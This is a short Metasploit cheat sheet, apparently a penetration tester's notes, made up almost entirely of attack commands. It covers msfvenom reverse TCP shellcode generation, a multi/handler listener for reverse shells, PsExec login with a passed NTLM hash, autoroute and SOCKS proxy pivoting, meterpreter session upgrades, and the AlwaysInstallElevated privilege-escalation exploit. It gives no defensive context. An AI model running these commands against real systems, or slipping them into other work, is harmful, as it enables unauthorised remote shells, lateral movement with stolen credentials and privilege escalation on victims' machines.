# Metasploit

## msfvenom
### Reverse TCP Shellcode
```bash
msfvenom -p <payload> LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -f <format>
```

## msfconsole

### Start Console
```
msfconsole
```

### Reverse Shell Handler
```msfconsole
use multi/handler
set payload <payload>
set LHOST 0.0.0.0
set LPORT 443
exploit
```

### PsExec
```msfconsole
use windows/smb/psexec
set RHOSTS 192.168.1.1
set SMBDomain <domain>
set SMBPass 00000000000000000000000000000000:<hash>
set SMBUser <user>
set LHOST 0.0.0.0
set LPORT 443
exploit
```

### SOCK Proxy
```msfconsole
use multi/manage/autoroute
route add 192.168.1.0 255.255.255.0 1
use auxiliary/server/socks_proxy
run
```

### Upgrade to meterpreter
```msfconsole
sessions -u <id>
```

### AlwaysInstallElevated
```msfconsole
use exploit/windows/local/always_install_elevated
set LHOST <lhost>
set LPORT 443
set payload windows/x64/meterpreter/reverse_tcp
set session <id>
run
```